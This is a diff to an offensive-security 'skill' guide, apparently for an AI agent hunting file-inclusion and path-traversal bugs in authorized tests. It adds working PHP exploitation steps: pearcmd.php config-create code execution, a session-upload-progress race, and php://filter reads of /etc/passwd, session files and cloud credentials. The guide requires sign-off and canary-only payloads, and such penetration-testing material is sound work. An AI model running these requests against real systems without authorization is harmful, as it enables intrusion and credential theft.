@@ -1,7 +1,7 @@
 ---
 name: hunt-lfi
-description: "Hunt Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path Traversal — /etc/passwd read, log poisoning → RCE, PHP filter-chain RCE (no upload needed), php:// / data:// / zip:// / phar:// wrappers, RFI via allow_url_include, directory traversal read/write/delete. Covers OOB/blind LFI confirmation and false-positive discipline. Use when hunting file-include or path-traversal bugs on any target."
-sources: hackerone_public, synacktiv_research, portswigger_research
+description: "Hunt Local File Inclusion (LFI), Remote File Inclusion (RFI), and Path Traversal — /etc/passwd read, log poisoning → RCE, PHP filter-chain RCE (no upload needed), php:// / data:// / zip:// / phar:// wrappers, RFI via allow_url_include, directory traversal read/write/delete, pearcmd.php config-create RCE on containerised PHP, and PHP_SESSION_UPLOAD_PROGRESS to force a controlled session file when no writable path is known. Covers OOB/blind LFI confirmation and false-positive discipline. Use when hunting file-include or path-traversal bugs on any target."
+sources: hackerone_public, synacktiv_research, portswigger_research, hacktricks_coverage_checklist, php_documentation, php_src, watchtowr_research, orange_tsai_research, leavesongs_research
 report_count: 24
 ---
 
@@ -64,6 +64,8 @@ JSON bodies: {"filename":...} {"template":...} {"path":...}
 | Python Flask/Django | `/proc/self/environ`, `settings.py`, `SECRET_KEY` |
 | Node.js file-serve / `res.sendFile`, `express.static` | path-traversal read, `require()` traversal |
 | Windows IIS / .NET | `..\..\web.config`, `C:\Windows\win.ini`, machineKey |
+| Official PHP Docker image (no `php.ini` in `/usr/local/etc/php/`) | `pearcmd.php` → RCE (Phase 8c): PEAR present and `register_argc_argv` at its On default |
+| PHP with `session.use_strict_mode=0` and `save_handler=files` | `PHP_SESSION_UPLOAD_PROGRESS` → controlled session file (Phase 8d) |
 
 ---
 
@@ -174,6 +176,175 @@ Two LFI/traversal surfaces that are not query-parameter file reads:
 - **Zip Slip / tar-symlink escape** — a server that untars/unzips a user-supplied archive follows `../../` entry names or embedded symlinks (tar preserves them) to read/write outside the extraction dir. Craft an archive entry named `../../../etc/cron.d/x`, or a symlink pointing at `/etc/passwd`; confirm by writing a unique canary outside the upload dir. Disclosed: reports/1439593, reports/733072, reports/822262.
 - **ImageMagick coder read-sink** — image convert/thumbnail/avatar features read local files via MSL/MVG coders even with no file parameter: filename/label `label:@/etc/passwd`, or an MSL payload (`<image xlink:href="msl:/etc/passwd">`) plus `msl:`/`ephemeral:` pseudo-protocols (ImageTragick CVE-2016-3714 family). Disclosed: reports/1858574. Pairs with `hunt-file-upload`.
 
+### Phase 8c — `pearcmd.php` → RCE (containerised PHP, no upload endpoint)
+A pure *read* LFI becomes **code execution** by including a PHP file that is
+already on disk and that takes its arguments from the query string. PEAR's
+command-line front end is that file. This achieves RCE, so the write step is
+**Stage B** and needs explicit RCE-attempt sign-off.
+
+**Why it works, and the exact preconditions:**
+- **The gadget file.** `/usr/local/lib/php/pearcmd.php` is present on the
+  official PHP Docker images, which configure PHP `--with-pear`. PEAR shipped by
+  default up to PHP 7.3; from 7.4 on it needs that explicit configure flag,
+  which the `docker-library/php` images set. On a Debian or Ubuntu host the
+  package path differs, so confirm the path by reading it (Stage A below) rather
+  than assuming.
+- **`register_argc_argv` must be On.** Its compiled default is `1`.
+  `php.ini-production` ships the line commented out as
+  `;register_argc_argv = Off`, and the official images copy `php.ini-*` into
+  `/usr/local/etc/php/` **without activating either file**, so no `php.ini`
+  exists and the On default applies. That is the real reason containers are the
+  target and a hardened host usually is not. Deprecated for non-CLI SAPIs as of
+  **PHP 8.5.0** (an `E_DEPRECATED` is raised), so expect this to decay.
+- **How the query string becomes `$argv`.** In php-src,
+  `php_auto_globals_create_server()` calls
+  `php_build_argv(SG(request_info).query_string, ...)` when
+  `PG(register_argc_argv)` is on and `SG(request_info).argc` is 0.
+  `php_build_argv` splits the **raw** query string on `+` and has **no check for
+  `=`**. PEAR's `Console_Getopt::readPHPArgv()` then falls back to
+  `$_SERVER['argv']`. (The common claim that the parameter must contain no `=`
+  describes RFC 3875's indexed-query rule, which PHP does not follow here.)
+- **`config-create` is the write primitive.** It reaches PEAR's
+  `writeConfigFile()`, which serialises config data to a path given on the
+  command line. The attacker's PHP source rides along inside that file's
+  contents.
+
+```bash
+# Stage A — detection only. Two independent reads, no write, no execution.
+# (a) Read the gadget through the filter from Phase 3.
+?file=php://filter/convert.base64-encode/resource=/usr/local/lib/php/pearcmd.php
+# Base64 decoding to PEAR CLI source → gadget present, Stage B is viable.
+# An empty or garbage decode is INCONCLUSIVE, not negative: php://filter must
+# lead the string, so a sink that prepends a base dir cannot be reached this way
+# and ../ padding does not help. Only treat it as negative if a Phase 3 filter
+# read already works on this same sink.
+#
+# (b) Fallback fingerprint when the sink prepends a base dir: include pearcmd
+# with NO '+' arguments and look for PEAR's command list. Verified on
+# php:8.3-cli, it begins:
+#   Commands:
+#   build                  Build an Extension From C Source
+#   bundle                 Unpacks a Pecl Package
+#   channel-add            Add a Channel
+?file=../../../../../../usr/local/lib/php/pearcmd.php
+# Save the unmodified response body as the Stage B diff baseline.
+```
+
+```bash
+# Stage B — ONLY with explicit written RCE-attempt sign-off.
+# The written file must be canary-only. NEVER a webshell: a file left in /tmp
+# that evaluates POST data is a backdoor you installed on the client's host.
+#
+# The canary must be a TRANSFORM, not a literal. The payload text ends up in the
+# written file as plain source, so a readfile()/file_get_contents() sink echoes a
+# literal canary back without executing anything. md5() of the canary can only
+# appear if the code actually ran.
+CANARY="LFIP$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
+EXPECT=$(printf '%s' "$CANARY" | md5sum | cut -d' ' -f1)   # computed locally
+# Step 1 — write /tmp/cbh_<rand>.php. The raw query string is split on literal
+# '+', so argv becomes ["", "config-create", "<root-dir carrying the PHP
+# source>", "<output path>"] and PEAR serialises the root dir into the file.
+GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=md5('$CANARY')?>+/tmp/cbh_$CANARY.php
+# Step 2 — include what was written.
+GET /index.php?file=/tmp/cbh_$CANARY.php
+# Confirmed RCE requires ALL THREE:
+#   1. $EXPECT (the digest) present in the step-2 body;
+#   2. the literal string "<?=" ABSENT from that body — its presence means the
+#      sink printed the file instead of executing it, which is file read, not RCE;
+#   3. $EXPECT absent from the Stage A baseline.
+# The written file is a PEAR config blob, so the digest appears inside a
+# serialized structure whose s:<n>: length prefixes no longer match. That is
+# expected and is itself evidence the value was substituted at runtime.
+```
+Notes / gotchas:
+- The split happens on the **raw** query string, so `+` must arrive as a literal
+  `+` and the `<?= ... ?>` must not be percent-encoded. Use Burp Repeater or
+  `curl -g` with the URL quoted. A browser address bar re-encodes and the
+  payload silently fails.
+- When the sink appends `.php` (`include($x.".php")`), drop the extension from
+  both paths: include `.../php/pearcmd` and write `/tmp/<name>.php`, then
+  include `/tmp/<name>`. This is the Form Tools 3.1.1 shape documented by
+  watchTowr.
+- **Persistence you must report.** The written file survives until `/tmp` is
+  cleared. Give the owner the exact path in the report so it can be deleted, and
+  use a random name so it is attributable to you and not reusable by anyone else.
+
+### Phase 8d — `PHP_SESSION_UPLOAD_PROGRESS` (forcing a file to exist)
+When no writable path is known and no upload endpoint exists, PHP's upload
+progress feature will create a session file **with attacker-controlled content**
+even though the application never started a session. Reaching code execution
+through it is **Stage B**.
+
+Preconditions, each verifiable and each a hard stop if wrong:
+
+| Setting | Default | Why it matters |
+|---|---|---|
+| `session.upload_progress.enabled` | `"1"` | Off means no progress entry is ever written. |
+| `session.upload_progress.name` | `"PHP_SESSION_UPLOAD_PROGRESS"` | The multipart field name that triggers it. |
+| `session.upload_progress.prefix` | `"upload_progress_"` | Prepended to your value, so the file does **not** start with your bytes. |
+| `session.upload_progress.cleanup` | `"1"` | Progress data is deleted once the POST is fully read. This is what makes it a race. |
+| `session.use_strict_mode` | `"0"` | **If this is `1` the technique is dead**: PHP refuses an uninitialised session id and issues its own, so you cannot predict the filename. |
+| `session.save_handler` | `"files"` | Redis or memcached means there is no session *file* to include. |
+
+```bash
+# Stage A — detection only. The signal is "a session file EXISTS for a
+# session id I chose", compared against a control id I never sent. It must be a
+# multipart upload, and the progress field must come BEFORE the file part; a
+# plain -d form field does NOT create the file.
+#
+# Important: with cleanup=On (the default), the progress entry is zeroed the
+# instant the POST finishes, so a SEQUENTIAL read-back sees an empty file, not
+# your content. Verified on php:8.3-cli: after the request, sess_<CANARY> exists
+# but is 0 bytes. So Stage A proves EXISTENCE, not content retrieval. Reading
+# content back is the Stage B race below.
+CANARY="LFIS$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')"
+head -c 4096 /dev/urandom > /tmp/cbh_probe.bin   # a real, non-empty file part
+curl -s "https://$TARGET/" -H "Cookie: PHPSESSID=$CANARY" \
+  -F "PHP_SESSION_UPLOAD_PROGRESS=$CANARY" -F "file=@/tmp/cbh_probe.bin"
+# Then probe for the two files through the filter from Phase 3:
+?file=php://filter/convert.base64-encode/resource=/var/lib/php/sessions/sess_<CANARY>
+?file=php://filter/convert.base64-encode/resource=/var/lib/php/sessions/sess_<CANARY-never-sent>
+# Candidate save paths: /var/lib/php/sessions/  /var/lib/php5/sessions/  /tmp/
+# The chosen id resolves to a readable (if empty) file while the control id does
+# not. That existence differential is a reportable file-write-primitive finding
+# on its own, independent of winning the content race.
+```
+
+```bash
+# Stage B — ONLY with explicit written RCE-attempt sign-off. Canary-only payload.
+# Hold the race window open with ONE slow large multipart upload rather than a
+# flood: concurrency max 2, max 20 attempts, then stop. A request flood against
+# a PHP-FPM pool is a denial of service, not a proof.
+#   part 1: PHP_SESSION_UPLOAD_PROGRESS=<?=md5('<CANARY>')?>
+#   part 2: a multi-megabyte file, uploaded slowly, to keep the entry alive
+# While it is in flight, include the session file in a second request.
+# Same three-part confirmation as Phase 8c: the md5 digest present, the literal
+# "<?=" absent, the digest absent from the baseline. A transform, never a
+# webshell: the goal is to prove execution once, not to leave a runnable file.
+```
+Notes / gotchas:
+- `include` executes `<?php` or `<?=` found **anywhere** in the file, so the
+  `upload_progress_` prefix is harmless and the triple-base64 prefix-stripping
+  trick from the original HITCON challenge is only needed when the loader
+  additionally requires the content to *begin* with a given string.
+- With `cleanup=On` (the default) the entry vanishes as soon as the POST is
+  fully read, which is why the slow upload matters. If `cleanup` has been turned
+  off, the file persists and there is no race at all.
+- An Nginx or other proxy that buffers the request body hides the upload from
+  PHP until it completes, which also kills the technique.
+
+### Phase 8e — deliberately out of scope (no-writable-path family)
+Several further LFI-to-RCE routes exist for the same "no writable path known"
+problem and are **excluded from this skill on purpose**, because each one is a
+denial of service, a request flood, or a tight race against a production
+target: the `phpinfo()` temp-file race, the Nginx `client_body_temp` descriptor
+race, the segmentation-fault temp-file retention trick, the "eternal waiting"
+filename brute force, the `compress.zlib` + `PHP_STREAM_PREFER_STDIO`
+path-disclosure race, and the generic temp-file-upload filename brute force.
+Phases 8c and 8d cover the same gap without flooding anything. If a scope
+genuinely requires one of them, that is a separate
+conversation with the operator and a separate sign-off, not a step in a hunt.
+
 ### Phase 9 — Automation (then manual-confirm everything)
 ```bash
 ffuf -u "https://$TARGET/page.php?file=FUZZ" -w ~/wordlists/lfi.txt -mc all -fr "not found"
@@ -192,6 +363,9 @@ Verified, correctly-attributed references for the patterns above:
 - **CVE-2021-41773** — Apache HTTP Server 2.4.49 path traversal (`%2e` in normalized path) → file read, and RCE when `mod_cgi` is enabled.
 - **CVE-2021-42013** — Apache HTTP Server 2.4.50 incomplete fix for the above (double-encoded `%%32%65`) → traversal/RCE.
 - **CVE-2024-4577** — PHP-CGI argument injection on Windows (Best-Fit encoding); reachable on XAMPP-style stacks, chains from file-serve to RCE.
+- **`pearcmd.php` → RCE (Phase 8c)** — not a CVE; an abuse of PEAR's CLI front end plus PHP's own `register_argc_argv` behaviour. Grounding: [leavesongs, Docker PHP LFI getshell](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html) (original), [watchTowr on Form Tools 3.1.1](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) (the extension-appended variant), php-src `main/php_variables.c` (`php_build_argv` splits the raw query string on `+`), [PHP core ini directives](https://www.php.net/manual/en/ini.core.php) (`register_argc_argv` default and the 8.5.0 deprecation), and the [`docker-library/php`](https://github.com/docker-library/php) Dockerfiles (`--with-pear`, no active `php.ini`).
+- **`PHP_SESSION_UPLOAD_PROGRESS` (Phase 8d)** — not a CVE; documented PHP behaviour. Grounding: [PHP manual, session upload progress](https://www.php.net/manual/en/session.upload-progress.php) and [session configuration](https://www.php.net/manual/en/session.configuration.php) for every default in the table, plus [Orange Tsai's HITCON 2018 one-line-PHP challenge](https://blog.orange.tw/posts/2018-10-hitcon-ctf-2018-one-line-php-challenge/) for the original technique and the cleanup race.
+- Coverage for Phases 8c-8e was checked against the HackTricks `pentesting-web/file-inclusion` pages (<https://github.com/HackTricks-wiki/hacktricks>, CC BY-NC 4.0), used as a checklist only; the preconditions, defaults, staging and safety guidance above are written against the primary sources just listed.
 
 > Grounding note: this skill is built from 31 disclosed LFI/path-traversal reports. When citing a specific HackerOne report in your write-up, link the exact report URL/ID you used — do **not** paraphrase a report ID from memory. A wrong ID is worse than none.
 
@@ -240,6 +414,8 @@ C:\Windows\System32\inetsrv\config\applicationHost.config
 | File read | `/proc/self/environ`, `~/.aws/credentials` | env secrets, cloud keys → SSRF/IAM pivot |
 | Remote URL include | RFI (`allow_url_include`) | direct RCE — **Critical** |
 | File read + upload | phar:// / log / session poison | RCE — **Critical** |
+| File read, no upload, containerised PHP | `pearcmd.php` `+config-create+` (Phase 8c) | RCE — **Critical** |
+| File read, no writable path known | `PHP_SESSION_UPLOAD_PROGRESS` (Phase 8d) | file-write primitive, then RCE — **Critical** |
 | Source disclosure | full app source | hardcoded secrets, new sinks, machineKey |
 
 ---
